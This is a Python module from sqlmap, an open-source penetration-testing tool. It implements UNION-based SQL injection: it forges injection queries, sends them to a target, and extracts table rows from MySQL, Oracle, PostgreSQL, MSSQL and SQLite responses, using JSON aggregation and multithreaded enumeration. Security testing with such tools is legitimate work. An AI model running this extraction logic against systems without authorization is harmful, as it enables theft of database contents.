#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import json
import re
import time

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import firstNotNone
from lib.core.common import flattenValue
from lib.core.common import getConsoleWidth
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isDigit
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import parseUnionPage
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeDebugMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import unArrayizeValue
from lib.core.common import wasLastResponseDBMSError
from lib.core.compat import xrange
from lib.core.convert import decodeBase64
from lib.core.convert import getUnicode
from lib.core.convert import htmlUnescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HTTP_HEADER
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapSyntaxException
from lib.core.settings import MAX_BUFFERED_PARTIAL_UNION_LENGTH
from lib.core.settings import NULL
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.safe2bin import safecharencode
from thirdparty import six
from thirdparty.odict import OrderedDict

def _oneShotUnionUse(expression, unpack=True, limited=False):
    retVal = hashDBRetrieve("%s%s" % (conf.hexConvert or False, expression), checkConf=True)  # as UNION data is stored raw unconverted

    threadData = getCurrentThreadData()
    threadData.resumed = retVal is not None

    if retVal is None:
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector

        if not kb.jsonAggMode:
            injExpression = unescaper.escape(agent.concatQuery(expression, unpack))
            kb.unionDuplicates = vector[7]
            kb.forcePartialUnion = vector[8]

            # Note: introduced columns in 1.4.2.42#dev
            try:
                kb.tableFrom = vector[9]
                kb.unionTemplate = vector[10]
            except IndexError:
                pass

            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
            where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]
        else:
            injExpression = unescaper.escape(expression)
            where = vector[6]
            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, False)

        payload = agent.payload(newValue=query, where=where)

        # Perform the request
        page, headers, _ = Request.queryPage(payload, content=True, raise404=False)

        if page and kb.chars.start.upper() in page and kb.chars.start not in page:
            singleTimeWarnMessage("results seems to be upper-cased by force. sqlmap will automatically lower-case them")

            page = page.lower()

        incrementCounter(PAYLOAD.TECHNIQUE.UNION)

        if kb.jsonAggMode:
            for _page in (page or "", (page or "").replace('\\"', '"')):
                if Backend.isDbms(DBMS.MSSQL):
                    output = extractRegexResult(r"%s(?P<result>.*)%s" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
                    if output:
                        try:
                            retVal = ""
                            fields = re.findall(r'"([^"]+)":', extractRegexResult(r"{(?P<result>[^}]+)}", output))
                            for row in json.loads(output):
                                retVal += "%s%s%s" % (kb.chars.start, kb.chars.delimiter.join(getUnicode(row[field] or NULL) for field in fields), kb.chars.stop)
                        except:
                            retVal = None
                        else:
                            retVal = getUnicode(retVal)
                elif Backend.isDbms(DBMS.PGSQL):
                    output = extractRegexResult(r"(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
                    if output:
                        retVal = output
                else:
                    output = extractRegexResult(r"%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))
                    if output:
                        try:
                            retVal = ""
                            for row in json.loads(output):
                                # NOTE: for cases with automatic MySQL Base64 encoding of JSON array values, like: ["base64:type15:MQ=="]
                                for match in re.finditer(r"base64:type\d+:([^ ]+)", row):
                                    row = row.replace(match.group(0), decodeBase64(match.group(1), binary=False))
                                retVal += "%s%s%s" % (kb.chars.start, row, kb.chars.stop)
                        except:
                            retVal = None
                        else:
                            retVal = getUnicode(retVal)

                if retVal:
                    break
        else:
            # Parse the returned page to get the exact UNION-based
            # SQL injection output
            def _(regex):
                return firstNotNone(
                    extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE),
                    extractRegexResult(regex, removeReflectiveValues(listToStrValue((_ for _ in headers.headers if not _.startswith(HTTP_HEADER.URI)) if headers else None), payload, True), re.DOTALL | re.IGNORECASE)
                )

            # Automatically patching last char trimming cases
            if kb.chars.stop not in (page or "") and kb.chars.stop[:-1] in (page or ""):
                warnMsg = "automatically patching output having last char trimmed"
                singleTimeWarnMessage(warnMsg)
                page = page.replace(kb.chars.stop[:-1], kb.chars.stop)

            retVal = _("(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop))

        if retVal is not None:
            retVal = getUnicode(retVal, kb.pageEncoding)

            # Special case when DBMS is Microsoft SQL Server and error message is used as a result of UNION injection
            if Backend.isDbms(DBMS.MSSQL) and wasLastResponseDBMSError():
                retVal = htmlUnescape(retVal).replace("<br>", "\n")

            hashDBWrite("%s%s" % (conf.hexConvert or False, expression), retVal)

        elif not kb.jsonAggMode:
            trimmed = _("%s(?P<result>.*?)<" % (kb.chars.start))

            if trimmed:
                warnMsg = "possible server trimmed output detected "
                warnMsg += "(probably due to its length and/or content): "
                warnMsg += safecharencode(trimmed)
                logger.warning(warnMsg)

            elif re.search(r"ORDER BY [^ ]+\Z", expression):
                debugMsg = "retrying failed SQL query without the ORDER BY clause"
                singleTimeDebugMessage(debugMsg)

                expression = re.sub(r"\s*ORDER BY [^ ]+\Z", "", expression)
                retVal = _oneShotUnionUse(expression, unpack, limited)

            elif kb.nchar and re.search(r" AS N(CHAR|VARCHAR)", agent.nullAndCastField(expression)):
                debugMsg = "turning off NATIONAL CHARACTER casting"  # NOTE: in some cases there are "known" incompatibilities between original columns and NCHAR (e.g. http://testphp.vulnweb.com/artists.php?artist=1)
                singleTimeDebugMessage(debugMsg)

                kb.nchar = False
                retVal = _oneShotUnionUse(expression, unpack, limited)
    else:
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
        kb.unionDuplicates = vector[7]

    return retVal

def configUnion(char=None, columns=None):
    def _configUnionChar(char):
        if not isinstance(char, six.string_types):
            return

        kb.uChar = char

        if conf.uChar is not None:
            kb.uChar = char.replace("[CHAR]", conf.uChar if isDigit(conf.uChar) else "'%s'" % conf.uChar.strip("'"))

    def _configUnionCols(columns):
        if not isinstance(columns, six.string_types):
            return

        columns = columns.replace(' ', "")
        if '-' in columns:
            colsStart, colsStop = columns.split('-')
        else:
            colsStart, colsStop = columns, columns

        if not isDigit(colsStart) or not isDigit(colsStop):
            raise SqlmapSyntaxException("--union-cols must be a range of integers")

        conf.uColsStart, conf.uColsStop = int(colsStart), int(colsStop)

        if conf.uColsStart > conf.uColsStop:
            errMsg = "--union-cols range has to represent lower to "
            errMsg += "higher number of columns"
            raise SqlmapSyntaxException(errMsg)

    _configUnionChar(char)
    _configUnionCols(conf.uCols or columns)

def unionUse(expression, unpack=True, dump=False):
    """
    This function tests for an UNION SQL injection on the target
    URL then call its subsidiary function to effectively perform an
    UNION SQL injection on the affected URL
    """

    initTechnique(PAYLOAD.TECHNIQUE.UNION)

    abortedFlag = False
    count = None
    origExpr = expression
    startLimit = 0
    stopLimit = None
    value = None

    width = getConsoleWidth()
    start = time.time()

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)

    # Set kb.partRun in case the engine is called from the API
    kb.partRun = getPartRun(alias=False) if conf.api else None

    if expressionFieldsList and len(expressionFieldsList) > 1 and "ORDER BY" in expression.upper():
        # Removed ORDER BY clause because UNION does not play well with it
        expression = re.sub(r"(?i)\s*ORDER BY\s+[\w,]+", "", expression)
        debugMsg = "stripping ORDER BY clause from statement because "
        debugMsg += "it does not play well with UNION query SQL injection"
        singleTimeDebugMessage(debugMsg)

    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL, DBMS.SQLITE) and expressionFields and not any((conf.binaryFields, conf.limitStart, conf.limitStop, conf.forcePartial, conf.disableJson)):
        match = re.search(r"SELECT\s*(.+?)\bFROM", expression, re.I)
        if match and not (Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression) and not re.search(r"\b(MIN|MAX|COUNT|EXISTS)\(", expression):
            kb.jsonAggMode = True
            if Backend.isDbms(DBMS.MYSQL):
                query = expression.replace(expressionFields, "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')" % (kb.chars.start, kb.chars.delimiter, ','.join(agent.nullAndCastField(field) for field in expressionFieldsList), kb.chars.stop), 1)
            elif Backend.isDbms(DBMS.ORACLE):
                query = expression.replace(expressionFields, "'%s'||JSON_ARRAYAGG(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)
            elif Backend.isDbms(DBMS.SQLITE):
                query = expression.replace(expressionFields, "'%s'||JSON_GROUP_ARRAY(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
            elif Backend.isDbms(DBMS.PGSQL):    # Note: ARRAY_AGG does CSV alike output, thus enclosing start/end inside each item
                query = expression.replace(expressionFields, "ARRAY_AGG('%s'||%s||'%s')::text" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s::text,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
            elif Backend.isDbms(DBMS.MSSQL):
                query = "'%s'+(%s FOR JSON AUTO, INCLUDE_NULL_VALUES)+'%s'" % (kb.chars.start, expression, kb.chars.stop)
            output = _oneShotUnionUse(query, False)
            value = parseUnionPage(output)
            kb.jsonAggMode = False

    # We have to check if the SQL query might return multiple entries
    # if the technique is partial UNION query and in such case forge the
    # SQL limiting the query output one entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if value is None and (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or kb.forcePartialUnion or conf.forcePartial or (dump and (conf.limitStart or conf.limitStop)) or "LIMIT " in expression.upper()) and " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            output = _oneShotUnionUse(countedExpression, unpack)
            count = unArrayizeValue(parseUnionPage(output))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    debugMsg = "used SQL query returns "
                    debugMsg += "%d %s" % (stopLimit, "entries" if stopLimit > 1 else "entry")
                    logger.debug(debugMsg)

            elif count and (not isinstance(count, six.string_types) or not count.isdigit()):
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warning(warnMsg)

                stopLimit = 1

            elif not isNumPosStrValue(count):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warning(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if isNumPosStrValue(count) and int(count) > 1:
                threadData = getCurrentThreadData()

                try:
                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))
                except OverflowError:
                    errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
                    errMsg += "with switch '--fresh-queries'"
                    raise SqlmapDataException(errMsg)

                numThreads = min(conf.threads, (stopLimit - startLimit))
                threadData.shared.value = BigArray()
                threadData.shared.buffered = []
                threadData.shared.counter = 0
                threadData.shared.lastFlushed = startLimit - 1
                threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1

                if threadData.shared.showEta:
                    threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))

                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                    kb.suppressResumeInfo = True
                    debugMsg = "suppressing possible resume console info for "
                    debugMsg += "large number of rows as it might take too long"
                    logger.debug(debugMsg)

                try:
                    def unionThread():
                        threadData = getCurrentThreadData()

                        while kb.threadContinue:
                            with kb.locks.limit:
                                try:
                                    threadData.shared.counter += 1
                                    num = next(threadData.shared.limits)
                                except StopIteration:
                                    break

                            if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                                field = expressionFieldsList[0]
                            elif Backend.isDbms(DBMS.ORACLE):
                                field = expressionFieldsList
                            else:
                                field = None

                            limitedExpr = agent.limitQuery(num, expression, field)
                            output = _oneShotUnionUse(limitedExpr, unpack, True)

                            if not kb.threadContinue:
                                break

                            if output:
                                with kb.locks.value:
                                    if all(_ in output for _ in (kb.chars.start, kb.chars.stop)):
                                        items = parseUnionPage(output)

                                        if threadData.shared.showEta:
                                            threadData.shared.progress.progress(threadData.shared.counter)
                                        if isListLike(items):
                                            # in case that we requested N columns and we get M!=N then we have to filter a bit
                                            if len(items) > 1 and len(expressionFieldsList) > 1:
                                                items = [item for item in items if isListLike(item) and len(item) == len(expressionFieldsList)]
                                            items = [_ for _ in flattenValue(items)]
                                            if len(items) > len(expressionFieldsList):
                                                filtered = OrderedDict()
                                                for item in items:
                                                    key = re.sub(r"[^A-Za-z0-9]", "", item).lower()
                                                    if key not in filtered or re.search(r"[^A-Za-z0-9]", item):
                                                        filtered[key] = item
                                                items = list(six.itervalues(filtered))
                                            items = [items]
                                        index = None
                                        for index in xrange(1 + len(threadData.shared.buffered)):
                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
                                                break
                                        threadData.shared.buffered.insert(index or 0, (num, items))
                                    else:
                                        index = None
                                        if threadData.shared.showEta:
                                            threadData.shared.progress.progress(threadData.shared.counter)
                                        for index in xrange(1 + len(threadData.shared.buffered)):
                                            if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
                                                break
                                        threadData.shared.buffered.insert(index or 0, (num, None))

                                        items = output.replace(kb.chars.start, "").replace(kb.chars.stop, "").split(kb.chars.delimiter)

                                    while threadData.shared.buffered and (threadData.shared.lastFlushed + 1 >= threadData.shared.buffered[0][0] or len(threadData.shared.buffered) > MAX_BUFFERED_PARTIAL_UNION_LENGTH):
                                        threadData.shared.lastFlushed, _ = threadData.shared.buffered[0]
                                        if not isNoneValue(_):
                                            threadData.shared.value.extend(arrayizeValue(_))
                                        del threadData.shared.buffered[0]

                                if conf.verbose == 1 and not (threadData.resumed and kb.suppressResumeInfo) and not threadData.shared.showEta and not kb.bruteMode:
                                    _ = ','.join("'%s'" % _ for _ in (flattenValue(arrayizeValue(items)) if not isinstance(items, six.string_types) else [items]))
                                    status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", _ if kb.safeCharEncode else safecharencode(_))

                                    if len(status) > width and not conf.noTruncate:
                                        status = "%s..." % status[:width - 3]

                                    dataToStdout("%s\n" % status)

                    runThreads(numThreads, unionThread)

                    if conf.verbose == 1:
                        clearConsoleLine(True)

                except KeyboardInterrupt:
                    abortedFlag = True

                    warnMsg = "user aborted during enumeration. sqlmap "
                    warnMsg += "will display partial output"
                    logger.warning(warnMsg)

                finally:
                    for _ in sorted(threadData.shared.buffered):
                        if not isNoneValue(_[1]):
                            threadData.shared.value.extend(arrayizeValue(_[1]))
                    value = threadData.shared.value
                    kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        output = _oneShotUnionUse(expression, unpack)
        value = parseUnionPage(output)

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d quer%s in %.2f seconds" % (kb.counters[PAYLOAD.TECHNIQUE.UNION], 'y' if kb.counters[PAYLOAD.TECHNIQUE.UNION] == 1 else "ies", duration)
        logger.debug(debugMsg)

    return value
